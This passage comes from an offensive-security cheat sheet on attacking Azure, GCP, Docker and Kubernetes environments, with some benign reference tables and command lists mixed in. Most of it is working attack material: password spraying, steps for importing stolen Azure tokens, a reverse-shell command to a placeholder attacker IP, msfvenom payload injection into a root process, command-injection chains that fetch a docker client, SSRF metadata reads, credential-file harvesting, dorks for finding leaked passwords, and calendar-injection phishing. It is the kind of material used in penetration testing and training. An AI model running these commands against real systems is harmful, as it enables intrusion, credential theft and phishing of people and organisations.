• If the Azure portal is locked down it is still possible to access Azure AD user information via MSOnline cmdlets
• The below examples enumerate users and groups
    PS> Get-MSolUser -All
    PS> Get-MSolGroup –All
    PS> Get-MSolGroupMember –GroupObjectId 
• Pipe Get-MSolUser –All to format list to get all user attributes
    PS> Get-MSolUser –All | fl

Azure Resource Groups
• Resource Groups collect various services for easier management
• Recon can help identify the relationships between services such as WebApps and SQL
    PS> Get-AzResource
    PS> Get-AzResourceGroup

Azure: Runbooks
• Azure Runbooks automate various tasks in Azure
• Require an Automation Account and can contain sensitive information like passwords
    PS> Get-AzAutomationAccount
    PS> Get-AzAutomationRunbook -AutomationAccountName  -ResourceGroupName 
• Export a runbook with:
    PS> Export-AzAutomationRunbook -AutomationAccountName  -ResourceGroupName  -Name  -OutputFolder .\Desktop\

Quick 1-liner to search all Azure AD user attributes for passwords after auth'ing with Connect-MsolService:  $x=Get-MsolUser;foreach($u in $x){$p = @();$u|gm|%{$p+=$_.Name};ForEach($s in $p){if($u.$s -like "*password*"){Write("[*]"+$u.UserPrincipalName+"["+$s+"]"+" : "+$u.$s)}}}

https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html

# Removing Azure services
- Under Azure Portal -> Resource Groups
```

### **Azure attacks examples**

```text
# Password spraying
https://github.com/dafthack/MSOLSpray/MSOLSpray.ps1
Create a text file with ten (10) fake users we will spray along with your own user account (YourAzureADUser@youraccount.onmicrosoft.com ). (Do not spray accounts you do not own. You may use my domain “glitchcloud.com” for generating fake target users) and save as userlist.txt

Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password [the password you set for your test account]

# Access Token

PS> Import-Module Az
PS> Connect-AzAccount
PS> mkdir C:\Temp
PS> Save-AzContext –Path C:\Temp\AzureAccessToken.json
PS> mkdir “C:\Temp\Live Tokens”

Open Windows Explorer and type %USERPROFILE%\.Azure\ and hit enter
• Copy TokenCache.dat & AzureRmContext.json to C:\Temp\Live Tokens
• Now close your authenticated PowerShell window!

Delete everything in %USERPROFILE%\.azure\
• Start a brand new PowerShell window and run:
PS> Import-Module Az
PS> Get-AzContext -ListAvailable
• You shouldn’t see any available contexts currently

• In your PowerShell window let’s manipulate the stolen TokenCache.dat and AzureRmContext.json files so we can import it into our PowerShell session

PS> $bytes = Get-Content "C:\Temp\Live Tokens\TokenCache.dat" -Encoding byte
PS> $b64 = [Convert]::ToBase64String($bytes)
PS> Add-Content "C:\Temp\Live Tokens\b64-token.txt" $b64

• Now let’s add the b64-token.txt to the AzureRmContext.json file.
• Open the C:\Temp\Live Tokens folder.
• Open AzureRmContext.json file in a notepad and find the line near the end of the file title “CacheData”. It should be null.
• Delete the word “null” on this line
• Where “null” was add two quotation marks (“”) and then paste the contents of b64-token.txt in between them.
• Save this file as C:\Temp\Live Tokens\StolenToken.json
• Let’s import the new token

PS> Import-AzContext -Profile 'C:\Temp\Live Tokens\StolenToken.json’

• We are now operating in an authenticated session to Azure

PS> $context = Get-AzContext
PS> $context.Account

• You can import the previously exported context (AzureAccessToken.json) the same way

# Azure situational awareness
• GOAL: Use the MSOnline and Az PowerShell modules to do basic enumeration of an Azure account post-compromise.
• In this lab you will authenticate to Azure using your Azure AD account you setup. Then, you will import the MSOnline and Az PowerShell modules and try out some of the various modules that assist in enumerating Azure resource usage.

• Start a new PowerShell window and import both the MSOnline and Az modules
    PS> Import-Module MSOnline
    PS> Import-Module Az
• Authenticate to each service with your Azure AD account:
    PS> Connect-AzAccount
    PS> Connect-MsolService
• First get some basic Azure information 
    PS> Get-MSolCompanyInformation
• Some interesting items here are
   ◇ UsersPermissionToReadOtherUsersEnabled
   ◇ DirSyncServiceAccount
   ◇ PasswordSynchronizationEnabled
   ◇ Address/phone/emails
• Next, we will start looking at the subscriptions associated with the account as well as look at the current context we are operating in. Look at the “Name” of the subscription and context for possible indication as to what it is associated with.
    PS> Get-AzSubscription
    PS> $context = Get-AzContext
    PS> $context.Name
    PS> $context.Account
• Enumerating the roles assigned to your user will help identify what permissions you might have on the subscription as well as who to target for escalation.
    PS> Get-AzRoleAssignment
• List out the users on the subscription. This is the equivalent of “net users /domain” in on-prem AD
    PS> Get-MSolUser -All
• The user you setup likely doesn’t have any resources currently associated with it, but these commands will help to understand the specific resources a user you gain access to has.
    PS> Get-AzResource
    PS> Get-AzResourceGroup
• There are many other functions.
• Use Get-Module to list out the other Az module groups
• To list out functions available within each module use the below command substituting the value of the “Name” parameter.
    PS> Get-Module -Name Az.Accounts | Select-Object -ExpandProperty ExportedCommands
    PS> Get-Module -Name MSOnline | Select-Object -ExpandProperty ExportedCommands
```

### **Azure Block Blobs\(S3 equivalent\) attacks**

```text
# Discovering with Google Dorks
site:*.blob.core.windows.net
site:*.blob.core.windows.net ext:xlsx | ext:csv "password"
# Discovering with Dns enumeration
python dnscan.py -d blob.core.windows.net -w subdomains-100.txt

# When you found one try with curl, an empty container respond with 400
```

### **Other Azure Services**

```text
# Azure App Services Subdomain Takeover
- For target example.com you found users.example.com
- Go https://users.galaxybutter.com and got an error
- dig CNAME users.galaxybutter.com and get an Azure App Services probably deprecated or removed
- Creat an App Service and point it to the missing CNAME
- Add a custom domain to the App Service
- Show custom content

# PoC from Forward DNS dataset
# This data is created by extracting domain names from a number of sources and then sending DNS queries for each domain.
https://opendata.rapid7.com/sonar.fdns_v2/
cat CNAME-DATASET-NAME | pigz -dc | grep -E "\.azurewebsites\.com"
cat CNAME-DATASET-NAME | pigz -dc | grep -E "\.s3\.amazonaws\.com"

# Azure Run Command
# Feature that allows you to execute commands without requiring SSH or SMB/RDP access to a machine. This is very similar to AWS SSM.
az login --use-device-code #Login
az group list #List groups
az vm list -g GROUP-NAME #List VMs inside group
#Linux VM
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunShellScript --scripts "id"
#Windos VM
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunPowerShellScript --scripts "whoami"
# Linux Reverse Shell Azure Command
az vm run-command invoke -g GROUP-NAME -n VM-NAME --command-id RunShellScript --scripts "bash -c \"bash -i >& /dev/tcp/ATTACKER-EXTERNAL-IP/9090 0>&1\""

# Azure SQL Databases
- MSSQL syntaxis
- Dorks: "database.windows.net" site:pastebin.com
```

### Azure Services Summary

**Base services**

| Azure Service | Could be Called | Use this to... | Like AWS... |
| :--- | :--- | :--- | :--- |
| Virtual Machines | Servers | Move existing apps to the cloud without changing them. You manage the entire computer. | EC2 |
| Cloud Services | Managed Virtual Machines | Run applications on virtual machines that you don't have to manage, but can partially manage. |  |
| Batch | Azure Distributed Processing | Work on a large chunk of data by divvying it up between a whole bunch of machines. |  |
| RemoteApp | Remote Desktop for Apps | Expose non-web apps to users. For example, run Excel on your iPad. | AppStream |
| Web Apps | Web Site Host | Run websites \(.NET, Node.js, etc.\)  without managing anything extra. Scale automatically and easily. | Elastic Beanstalk |
| Mobile Apps | Mobile App Accelerator | Quickly get an app backend up and running. |  |
| Logic Apps | Visio for Doing Stuff | Chain steps together to get stuff done. |  |
| API Apps | API Host | Host your API's without any of the management overhead. |  |
| API Management | API Proxy | Expose an API and off-load things like billing, authentication, and caching. | API Gateway |

**Mobile**

| Azure Service | Could be Called | Use this to... | Like AWS... |
| :--- | :--- | :--- | :--- |
| Notification Hubs | Notification Blaster | Send notifications to all of your users, or groups of users based on things like zip code. All platforms. | SNS |
| Mobile Engagement | Mobile Psychic | Track what users are doing in your app, and customize experience based on this data. |  |

**Storage**

| Azure Service | Could be Called | Use this to... | Like AWS... |
| :--- | :--- | :--- | :--- |
| SQL Database | Azure SQL | Use the power of a SQL Server cluster without having to manage it. | RDS |
| Document DB | Azure NoSQL | Use an unstructured JSON database without having to manage it. | Dynamo DB |
| Redis Cache | Easy Cache | Cache files in memory in a scalable way. | Elasticache |
| Storage Blobs | Cloud File System | Store files, virtual disks, and build other storage services on top of. | S3 |
| Azure Search | Index & Search | Add search capabilities to your website, or index data stored somewhere else. | CloudSearch |
| SQL Data Warehouse | Structured Report Database | Store all of your company's data in a structured format for reporting. | RedShift |
| Azure Data Lake | Unstructured Report Database | Store all of your company's data in any format for reporting. |  |
| HDInsight | Hosted Hadoop | Do Hadoopy things with massive amounts of data. |  |
| Machine Learning | Skynet | Train AI to predict the future using existing data. Examples include credit card fraud detection and Netflix movie recommendations. |  |
| Stream Analytics | Real-time data query | Look for patterns in data as it arrives. |  |
| Data Factory | Azure ETL | Orchestrate extract, transform, and load data processes. | Data Pipeline |
| Event Hubs | IoT Ingestor | Ingest data at ANY scale inexpensively. |  |

**Networking**

| Azure Service | Could be Called | Use this to... | Like AWS... |
| :--- | :--- | :--- | :--- |
| Virtual Network | Private Network | Put machines on the same, private network so that they talk to each other directly and privately. Expose services to the internet as needed. |  |
| ExpressRoute | Fiber to Azure | Connect privately over an insanely fast pipe to an Azure datacenter. Make your local network part of your Azure network. | Direct Connect |
| Load Balancer | Load Balancer | Split load between multiple services, and handle failures. |  |
| Traffic Manager | Datacenter Load Balancer | Split load between multiple datacenters, and handle datacenter outages. |  |
| DNS | DNS Provider | Run a DNS server so that your domain names map to the correct IP addresses. | Route53 |
| VPN Gateway | Virtual Fiber to Azure | Connect privately to an Azure datacenter. Make your local network part of your Azure network. |  |
| Application Gateway | Web Site Proxy | Proxy all of your HTTP traffic. Host your SSL certs. Load balance with sticky sessions. |  |
| CDN | CDN | Make your sites faster and more scalable by putting your static files on servers around the world close to your end users. | Cloudfront |
| Media Services | Video Processor | Transcode video and distribute and manage it on the scale of the Olympics. | Elastic Transcoder |

**Management**

| Azure Service | Could be Called | Use this to... | Like AWS... |
| :--- | :--- | :--- | :--- |
| Azure Resource Manager | Declarative Configuration | Define your entire Azure architecture as a repeatable JSON file and deploy all at once. | CloudFormation |

**Developer**

| **Azure Service** | **Could be Called** | **Use this to...** | **Like AWS...** |
| :--- | :--- | :--- | :--- |
| Application Insights | App Analytics | View detailed information about how your apps \(web, mobile, etc.\) are used. | Mobile Analytics |
| Service Fabric | Cloud App Framework | Build a cloud optimized application that can scale and handle failures inexpensively. |  |

## GCP

```text
**Tools**
# Hayat https://github.com/DenizParlak/hayat

Auth methods:
• Web Access
• API – OAuth 2.0 protocol
• Access tokens – short lived access tokens for service accounts
• JSON Key Files – Long-lived key-pairs
• Credentials can be federated

Recon:
• G-Suite Usage
   ◇ Try authenticating with a valid company email address at Gmail

Google Storage Buckets:
• Google Cloud Platform also has a storage service called “Buckets”
• Cloud_enum from Chris Moberly (@initstring) https://github.com/initstring/cloud_enum
   ◇ Awesome tool for scanning all three cloud services for buckets and more
      ▪ Enumerates:
         - GCP open and protected buckets as well as Google App Engine sites
         - Azure storage accounts, blob containers, hosted DBs, VMs, and WebApps
         - AWS open and protected buckets

Phising G-Suite:
• Calendar Event Injection
• Silently injects events to target calendars
• No email required
• Google API allows to mark as accepted
• Bypasses the “don’t auto-add” setting
• Creates urgency w/ reminder notification
• Include link to phishing page

Steal Access Tokens:
• Google JSON Tokens and credentials.db
• JSON tokens typically used for service account access to GCP
• If a user authenticates with gcloud from an instance their creds get stored here:
    ~/.config/gcloud/credentials.db
    sudo find /home -name "credentials.db"
• JSON can be used to authenticate with gcloud and ScoutSuite

Post-compromise
• Cloud Storage, Compute, SQL, Resource manager, IAM
• ScoutSuite from NCC group https://github.com/nccgroup/ScoutSuite
• Tool for auditing multiple different cloud security providers
• Create Google JSON token to auth as service account
```

### **gcp.sh**

```text
#!/bin/sh
set -- $(dig -t txt +short _cloud-netblocks.googleusercontent.com +trace)
included="" ip4=""
while [ $# -gt 0 ]; do
k="${1%%:*}" v="${1#*:}"
case "$k" in
include)
# only include once
if [ "${included% $v *}" = "${included}" ]; then
set -- "$@" $(dig -t txt +short "$v")
included=" $v $included"
fi
;;
ip4) ip4="$v $ip4" ;;
esac
shift
done
for i in $ip4; do
echo "$i"
done
```

## Cloud OSINT

```text
# Azure IP Ranges
https://azurerange.azurewebsites.net/

# AWS IP Range
https://ip-ranges.amazonaws.com/ip-ranges.json
- Get creation date
jq .createDate < ip-ranges.json
- Get info for specific region
jq  '.prefixes[] | select(.region=="us-east-1")' < ip-ranges.json
- Get all IPs
jq -r '.prefixes | .[].ip_prefix' < ip-ranges.json

# Online services
https://viewdns.info/
https://securitytrails.com/
https://www.shodan.io/search?query=net%3A%2234.227.211.0%2F24%22
https://censys.io/ipv4?q=s3

# Google Dorks
site:*.amazonaws.com -www "compute"
site:*.amazonaws.com -www "compute" "ap-south-1"
site:pastebin.com "rds.amazonaws.com" "u " pass OR password

# Check certificate transparency logs
https://crt.sh
%.netfilx.com

- AWS Buckets
site:*.s3.amazonaws.com ext:xls | ext:xlsx | ext:csv password|passwd|pass user|username|uid|email
bucket_finder ~/tools/AWSBucketDump/BucketNames.txt -l results.txt

- AWS discovering, stealing keys and endpoints
# Nimbostratus - check against acutal profile
https://github.com/andresriancho/nimbostratus
python nimbostratus dump-credentials

# ScoutSuite - audit AWS, GCP and Azure clouds
scout --provider aws --profile stolen

# Prowler - AWS security assessment, auditing and hardening
https://github.com/toniblyx/prowler
```

#### GitLab

```text
GOAL: Identify a target code repository and then search through all commit history to discover secrets that have been mistakenly posted.
• Oftentimes, developers post access keys, or various other forms of credentials to code repositories on accident. Even if they remove the keys they may still be discoverable by searching through previous commit history.

sudo docker pull zricethezav/gitleaks
sudo docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git

Then visualize a commit:
https://github.com/[git account]/[repo name]/commit/[commit ID]
https://github.com/zricethezav/gitleaks/commit/744ff2f876813fbd34731e6e0d600e1a26e858cf
```

## Docker/Kubernetes

### Docker basics

#### Concepts

* Docker Image
  * Read only file with OS, libraries and apps
  * Anyone can create a docker image
  * Images can be stored in Docker hub \(default public registry\) or private registry
* Docker Container
  * Stateful instance of an image with a writable layer
  * Contains everything needed to run your application
  * Based on one or more images
* Docker Registry
  * Repository of images
* Docker Hub
  * Public docker registry
* Dockerfile
  * Configuration file that contains instructions for building a Docker image
* Docker-compose file
  * Configuration file for docker-compose
* Docker Swarm
  * Group of machines that are running Docker and joined into a cluster.
  * When you run docker commands, they are executed by a swarm manager.
* Portainer
  * Management solution for Docker hosts and Docker Swarm clusters
  * Via web interface
* Docker capabilities
  * Turn the binary "root/non-root" into a fine-grained access control system.
  * Processes that just need to bind on a port below 1024 do not have to run as root, they can just be granted the net\_bind\_service capability instead.
* Docker Control Groups
  * Used to allocate cpu, memory, network bandwith of host to container groups.

#### Commands

```text
# Search in docker hub
docker search wpscan
# Run docker container from docker hub
docker run ubuntu:latest echo "Welcome to Ubuntu"
# Run docker container from docker hub with interactive tty
docker run --name samplecontainer -it ubuntu:latest /bin/bash
# List running containers
docker ps
# List all containers
docker ps -a
# List docker images
docker images
# Run docker in background
docker run --name pingcontainer -d alpine:latest ping 127.0.0.1 -c 50
# Get container logs
docker logs -f pingcontainer
# Run container service in specified port
docker run -d --name nginxalpine -p 7777:80 nginx:alpine
# Access tty of running container
docker exec -it nginxalpine sh
# Get low-level info of docker object
docker inspect (container or image)
# Show image history
docker history jess/htop
# Stop container
docker stop dummynginx
# Remove container
docker rm dummynginx
# Run docker with specified PID namespace
docker run --rm -it --pid=host jess/htop

# Show logs
docker logs containername
docker logs -f containername
# Show service defined logs
docker service logs
# Look generated real time events by docker runtime
docker system events
docker events --since '10m'
docker events --filter 'image=alpine'
docker events --filter 'event=stop'

# Compose application (set up multicontainer docker app)
docker-compose up -d
# List docker volumes
docker volume ls
# Create volume
docker volume create vol1
# List docker networks
docker network ls
# Create docker network
docker network create net1
# Remove captability of container
docker run --rm -it --cap-drop=NET_RAW alpine sh
# Check capabilities inside container
docker run --rm -it 71aa5f3f90dc bash
capsh --print
# Run full privileged container
docker run --rm -it --privileged=true 71aa5f3f90dc bash
capsh --print
# From full privileged container you can access host devices
more /dev/kmsg

# Creating container groups
docker run -d --name='low_priority' --cpuset-cpus=0 --cpu-shares=10 alpine md5sum /dev/urandom
docker run -d --name='high_priority' --cpuset-cpus=0 --cpu-shares=50 alpine md5sum /dev/urandom
# Stopping cgroups
docker stop low_priority high_priority
# Remove cgroups
docker rm low_priority high_priority

# Setup docker swarm cluster
docker swarm init
# Check swarm nodes
docker node ls
# Start new service in cluster
docker service create --replicas 1 --publish 5555:80 --name nginxservice
nginx:alpine
# List services
docker service ls
# Inspect service
docker service inspect --pretty nginxservice
# Remove service
docker service rm nginxservice
# Leave cluster
docker swarm leave (--force if only one node)

# Start portainer
docker run -d -p 9000:9000 --name portainer \
--restart always -v /var/run/docker.sock:/var/run/docker.sock \
-v /opt/portainer:/data portainer/portainer
```

### Docker security basics

```text
# Get image checksum
docker images --digests ubuntu
# Check content trust to get signatures
docker trust inspect mediawiki --pretty
# Check vulns in container
- Look vulns in base image
- Use https://vulners.com/audit to check for docker packages
- Inside any container
cat /etc/issue
dpkg-query -W -f='${Package} ${Version} ${Architecture}\n'
- Using Trivy https://github.com/aquasecurity/trivy
trivy image knqyf263/vuln-image:1.2.3
# Check metadata, secrets, env variables
docker inspect <image name>
docker inspect <container name>
# Review image history
docker history image:latest
# Inspect everything
docker volume inspect wordpress_db_data
docker network inspect wordpress_default
# Interesting look in the volume mountpoints
docker volume inspect whatever
cd /var/lib/docker/volumes/whatever
# Integrity check for changed files
docker diff imagename
# Check if you're under a container
https://github.com/genuinetools/amicontained#usage
# Docker Bench Security (Security Auditor)
cd /opt/docker-bench-security
sudo bash docker-bench-security.sh
```

### Attack insecure volume mounts

```text
# After get reverse shell in docker container (eg insecure webapp with RCE)
# This commands are executed inside insecure docker container
# Check if it's available docker.sock
ls -l /var/run/docker.sock
# This allows to access the host docker service using host option with docker client by using the UNIX socket
# Now download docker client in container and run commands in host
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock images
```

### Attack docker misconfiguration

```text
# Docker container with exposed ports running docker service
# Docker API is exposed in those docker ports
# Check query docker API with curl
curl 10.11.1.111:2375/images/json | jq .
# Then you can run commands in host machine
docker -H tcp://10.11.1.111:2375 ps
docker -H tcp://10.11.1.111:2375 images
```

### Audit Docker Runtime and Registries

```text
# Runtime

# Host with multiple dockers running
# Check docker daemon
docker system info
# Check docker API exposed on 0.0.0.0
cat /lib/systemd/system/docker.service
# Check if docker socket is running in any container
docker inspect | grep -i '/var/run/'
# Check rest of files docker related
ls -l /var/lib/docker/
# Check for any secret folder
ls -l /var/run/
ls -l /run/

# Public Registries
# Docker registry is a distribution system for Docker images. There will be diferent images and each may contain multiple tags and versions. By default the registry runs on port 5000 without authentication and TLS
# Check if docker registry is up and running
curl -s http://localhost:5000/v2/_catalog | jq .
# Get tags of docker image
curl -s http://localhost:5000/v2/devcode/tags/list | jq .
# Download image locally
docker pull localhost:5000/devcode:latest
# Access container to review it
docker run --rm -it localhost:5000/devcode:latest sh
# Once mounted we can check the docker daemon config to see user and registry
docker system info
# And we can check the registries configured for the creds
cat ~/.docker/config.json

# Private registries
# Check catalog
curl 10.11.1.111:5000/v2/_catalog
# Get image tags
curl 10.11.1.111:5000/v2/privatecode/tags/list
# Add the insecure-registry tag to download docker image
vi /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H fd:// --insecure-registry 10.11.1.111:5000
# Restart docker service
sudo systemctl daemon-reload
sudo service docker restart
# Download the image
docker pull 10.11.1.111:5000/privatecode:whatevertag
# Enter inside container and enumerate
docker run --rm -it 10.11.1.111:5000/privatecode:golang-developer-team sh
cd /app
ls -la
```

### Attack container capabilities

```text
# Host with sys_ptrace capability enabled with host PID space. So it runs top command of host
# You're already inside container
# Check capabilities
capsh --print
# Upload reverse shell and linux-injector
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o payload.bin
# Check any process running as root
ps aux | grep root
./injector PID_RUNNING_AS_ROOT payload.bin
```

### Kubernetes basics

#### Concepts

* Kubernetes is a security orchestrator
* Kubernetes master provides an API to interact with nodes
* Each Kubernetes node run kubelet to interact with API and kube-proxy to refect Kubernetes networking services on each node.
* Kubernetes objects are abstractions of states of your system.
  * Pods: collection of container share a network and namespace in the same node.
  * Services: Group of pods running in the cluster.
  * Volumes: directory accesible to all containers in a pod. Solves the problem of loose info when container crash and restart.
  * Namespaces: scope of Kubernetes objects, like a workspace \(dev-space\).

#### Commands

```text
# kubectl cli for run commands against Kubernetes clusters
# Get info
kubectl cluster-info
# Get other objects info
kubectl get nodes
kubectl get pods
kubectl get services
# Deploy
kubectl run nginxdeployment --image=nginx:alpine
# Port forward to local machine
kubectl port-forward <PODNAME> 1234:80
# Deleting things
kubectl delete pod
# Shell in pod
kubectl exec -it <PODNAME> sh
# Check pod log
kubectl logs <PODNAME>
# List API resources
kubectl api-resources
# Check permissions
kubectl auth can-i create pods
# Get secrets
kubectl get secrets <SECRETNAME> -o yaml
# Get more info of specific pod
kubectl describe pod <PODNAME>
# Get cluster info
kubectl cluster-info dump

# kube-bench - secutity checker
kubectl apply -f kube-bench-node.yaml
kubectl get pods --selector job-name=kube-bench-node
kubectl logs kube-bench-podname
# kube-hunter - check security weaknesses
./kube-hunter.py
# kubeaudit
./kubeaudit all

# Known vulns
CVE-2018-1002105
CVE-2019-5736
CVE-2019-9901
```

### Attak Private Registry miconfiguration

```text
# Web application deployed vulnerable to lfi
# Read configuration through LFI
cat /root/.docker/config.json
# Download this file to your host and configure in your system
docker login -u _json_key -p "$(cat config.json)" https://gcr.io
# Pull the private registry image to get the backend source code
docker pull gcr.io/training-automation-stuff/backend-source-code:latest
# Inspect and enumerate the image
docker run --rm -it gcr.io/training-automation-stuff/backend-source-code:latest
# Check for secrets inside container
ls -l /var/run/secrets/kubernetes.io/serviceaccount/
# Check environment vars
printenv
```

### Attack Cluster Metadata with SSRF

```text
# Webapp that check the health of other web applications
# Request to 
curl http://169.254.169.254/computeMetadata/v1/
curl http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env
```

### Attack escaping pod volume mounts to access node and host

```text
# Webapp makes ping
# add some listing to find docker.sock
ping whatever;ls -l /custom/docker/
# Once found, download docker client
ping whatever;wget https://download.docker.com/linux/static/stable/x86_64/docker-18.09.1.tgz -O /root/docker-18.09.1.tgz
ping whatever;tar -xvzf /root/docker-18.09.1.tgz -C /root/
ping whatever;/root/docker/docker -H unix:///custom/docker/docker.sock ps
ping whatever;/root/docker/docker -H unix:///custom/docker/docker.sock images
```

## CDN - Domain Fronting

```text
**Tools**
https://github.com/rvrsh3ll/FindFrontableDomains 
https://github.com/stevecoward/domain-fronting-tools
```

